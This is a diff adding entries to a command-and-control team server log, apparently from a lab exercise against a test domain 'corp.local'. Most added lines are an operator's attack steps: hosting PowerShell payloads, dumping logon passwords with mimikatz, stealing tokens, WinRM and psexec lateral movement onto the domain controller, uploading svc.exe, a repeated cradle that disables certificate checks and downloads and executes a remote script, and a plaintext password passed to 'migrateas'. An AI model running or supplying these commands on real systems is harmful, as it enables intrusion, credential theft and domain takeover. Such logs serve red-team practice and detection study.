@@ -47,3 +47,74 @@
 31/05/2023 03:08:27 | Info | Agent | e1f27711b1 |  | Agent Checking In
 31/05/2023 03:09:00 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e | e1f27711b1 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::logonpasswords" exit
 31/05/2023 03:09:04 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e | e1f27711b1 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::logonpasswords" exit
+31/05/2023 05:57:07 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e |  | Exit TeamServer
+31/05/2023 05:57:47 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 |  | Connexion to TeamServer
+31/05/2023 05:57:48 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 |  | Connexion to TeamServer
+31/05/2023 06:03:04 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 |  | Web hosting a - Payload PowerShell x64 https://192.168.56.129:443
+31/05/2023 06:03:36 | Info | Agent | 8fd05153c7 |  | Agent Checking In
+31/05/2023 06:07:30 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 | 8fd05153c7 | Command tasked to agent : ps
+31/05/2023 06:08:01 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 | 8fd05153c7 | Command tasked to agent : steal-token 1936
+31/05/2023 06:08:19 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 | 8fd05153c7 | Command tasked to agent : shell whoami
+31/05/2023 06:08:27 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 | 8fd05153c7 | Command tasked to agent : winrm
+31/05/2023 06:08:42 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 | 8fd05153c7 | Command tasked to agent : winrm corp-dc.corp.local whoami
+31/05/2023 06:08:55 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 | 8fd05153c7 | Command tasked to agent : winrm corp-dc.corp.local Get-Process
+31/05/2023 06:09:11 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 | 8fd05153c7 | Command tasked to agent : winrm corp-dc.corp.local hostname
+31/05/2023 08:05:15 | Info | User | Fropops-fdb583b0-d8e5-40e3-a0ac-a74c7762b443 |  | Exit TeamServer
+31/05/2023 08:05:31 | Info | User | Fropops-28d1e962-bd9b-46dd-a420-a4d11e6745ad |  | Connexion to TeamServer
+31/05/2023 08:05:32 | Info | User | Fropops-28d1e962-bd9b-46dd-a420-a4d11e6745ad |  | Connexion to TeamServer
+31/05/2023 08:06:23 | Info | User | Fropops-28d1e962-bd9b-46dd-a420-a4d11e6745ad |  | Exit TeamServer
+31/05/2023 08:06:52 | Info | User | Fropops-6dee7e51-e78b-4df1-990f-b7cebf4be6c8 |  | Connexion to TeamServer
+31/05/2023 08:06:53 | Info | User | Fropops-6dee7e51-e78b-4df1-990f-b7cebf4be6c8 |  | Connexion to TeamServer
+31/05/2023 08:07:36 | Info | User | Fropops-6dee7e51-e78b-4df1-990f-b7cebf4be6c8 | 8fd05153c7 | Command tasked to agent : jump-winrm corp-dc.crop.local
+31/05/2023 08:08:06 | Info | User | Fropops-6dee7e51-e78b-4df1-990f-b7cebf4be6c8 | 8fd05153c7 | Command tasked to agent : winrm ps
+31/05/2023 08:08:39 | Info | User | Fropops-6dee7e51-e78b-4df1-990f-b7cebf4be6c8 | 8fd05153c7 | Command tasked to agent : winrm corp-dc.corp.local Get-Process | ft
+31/05/2023 08:13:46 | Info | User | Fropops-6dee7e51-e78b-4df1-990f-b7cebf4be6c8 | 8fd05153c7 | Command tasked to agent : jump-winrm corp-dc.corp.local
+31/05/2023 08:15:08 | Info | User | Fropops-6dee7e51-e78b-4df1-990f-b7cebf4be6c8 | 8fd05153c7 | Command tasked to agent : ps
+31/05/2023 08:17:55 | Info | User | Fropops-6dee7e51-e78b-4df1-990f-b7cebf4be6c8 |  | Exit TeamServer
+31/05/2023 08:18:04 | Info | User | Fropops-fc03a459-ef45-4c9d-82bf-eae0be5fa60b |  | Connexion to TeamServer
+31/05/2023 08:18:05 | Info | User | Fropops-fc03a459-ef45-4c9d-82bf-eae0be5fa60b |  | Connexion to TeamServer
+31/05/2023 08:18:21 | Info | User | Fropops-fc03a459-ef45-4c9d-82bf-eae0be5fa60b | 8fd05153c7 | Command tasked to agent : jump-winrm corp-dc.corp.local
+31/05/2023 08:21:06 | Info | User | Fropops-fc03a459-ef45-4c9d-82bf-eae0be5fa60b |  | Exit TeamServer
+31/05/2023 08:21:12 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b |  | Connexion to TeamServer
+31/05/2023 08:21:14 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b |  | Connexion to TeamServer
+31/05/2023 08:26:14 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b |  | Web hosting a - Payload PowerShell x64 https://192.168.174.128:443
+31/05/2023 08:26:59 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b |  | Web hosting a - Payload PowerShell x64 https://192.168.56.129:443
+31/05/2023 08:27:16 | Info | Agent | d908d665f3 |  | Agent Checking In
+31/05/2023 08:28:06 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | d908d665f3 | Command tasked to agent : winrm corp-dc.corp.local hostname
+31/05/2023 08:28:31 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | d908d665f3 | Command tasked to agent : jump-winrm corp-dc.corp.local
+31/05/2023 08:30:14 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | d908d665f3 | Command tasked to agent : winrm corp-dc.corp.local add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;(New-Object Net.WebClient).DownloadString('https://192.168.56.129:443/a') | iex
+31/05/2023 08:30:49 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | d908d665f3 | Command tasked to agent : winrm corp-dc.corp.local add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;(New-Object Net.WebClient).DownloadString('https://192.168.56.129:443/a') | iex
+31/05/2023 08:30:58 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | d908d665f3 | Command tasked to agent : winrm corp-dc.corp.local "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;(New-Object Net.WebClient).DownloadString('https://192.168.56.129:443/a') | iex
+31/05/2023 08:31:02 | Info | Agent | 04439a2460 |  | Agent Checking In
+31/05/2023 08:31:28 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | 04439a2460 | Command tasked to agent : terminate
+31/05/2023 08:32:05 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | d908d665f3 | Command tasked to agent : winrm corp-dc.corp.local "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;(New-Object Net.WebClient).DownloadString('https://192.168.56.129:443/a') | iex
+31/05/2023 08:32:08 | Info | Agent | d1c68298c7 |  | Agent Checking In
+31/05/2023 08:32:16 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | d1c68298c7 | Command tasked to agent : terminate
+31/05/2023 08:32:20 | Info | Agent | d5fde064a8 |  | Agent Checking In
+31/05/2023 08:32:47 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | d5fde064a8 | Command tasked to agent : terminate
+31/05/2023 08:33:26 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | d908d665f3 | Command tasked to agent : jump-winrm corp-dc.corp.local
+31/05/2023 08:37:11 | Info | Agent | 7a1432500e |  | Agent Checking In
+31/05/2023 08:39:00 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | 7a1432500e | Command tasked to agent : terminate
+31/05/2023 08:57:21 | Info | Agent | d908d665f3 |  | Agent Checking In
+31/05/2023 08:57:35 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | d908d665f3 | Command tasked to agent : terminate
+31/05/2023 08:57:58 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b |  | Web hosting z - Payload PowerShell x64 https://192.168.56.129:443
+31/05/2023 08:58:23 | Info | Agent | 4a1d715541 |  | Agent Checking In
+31/05/2023 08:59:28 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | 4a1d715541 | Command tasked to agent : cd \\corpd-dc.corp.local\c$\windows
+31/05/2023 08:59:38 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | 4a1d715541 | Command tasked to agent : cd \\corp-dc.corp.local\c$\windows
+31/05/2023 08:59:48 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | 4a1d715541 | Command tasked to agent : upload svc.exe
+31/05/2023 09:00:04 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b | 4a1d715541 | Command tasked to agent : ls
+31/05/2023 09:00:39 | Info | User | Fropops-7d94d604-fd23-47d0-a2bc-796246354a8b |  | Exit TeamServer
+31/05/2023 09:01:35 | Info | User | Fropops-baac9af3-10d1-4a82-9321-255cae9c3d93 |  | Connexion to TeamServer
+31/05/2023 09:01:35 | Info | User | Fropops-baac9af3-10d1-4a82-9321-255cae9c3d93 |  | Connexion to TeamServer
+31/05/2023 09:02:07 | Info | User | Fropops-baac9af3-10d1-4a82-9321-255cae9c3d93 | 4a1d715541 | Command tasked to agent : psexec corp-dc.corp.local c:\windows\svc.exe
+31/05/2023 09:02:31 | Info | Agent | f98f821236 |  | Agent Checking In
+31/05/2023 11:27:26 | Info | User | Fropops-baac9af3-10d1-4a82-9321-255cae9c3d93 |  | Exit TeamServer
+31/05/2023 11:27:45 | Info | User | Fropops-4ba8d183-8951-473b-8d39-94712e083ea9 |  | Connexion to TeamServer
+31/05/2023 11:27:46 | Info | User | Fropops-4ba8d183-8951-473b-8d39-94712e083ea9 |  | Connexion to TeamServer
+31/05/2023 11:27:53 | Info | User | Fropops-4ba8d183-8951-473b-8d39-94712e083ea9 |  | Web hosting z - Payload PowerShell x64 https://192.168.56.129:443
+31/05/2023 11:28:29 | Info | Agent | ecfc8df697 |  | Agent Checking In
+31/05/2023 11:28:45 | Info | User | Fropops-4ba8d183-8951-473b-8d39-94712e083ea9 |  | Exit TeamServer
+31/05/2023 11:28:51 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 |  | Connexion to TeamServer
+31/05/2023 11:28:52 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 |  | Connexion to TeamServer
+31/05/2023 11:32:58 | Info | User | Fropops-e747ab38-e572-4e64-a10b-9e4fc6224c45 | ecfc8df697 | Command tasked to agent : migrateas corp.local\pparker Password123
+31/05/2023 11:33:00 | Info | Agent | 956a7efbd6 |  | Agent Checking In
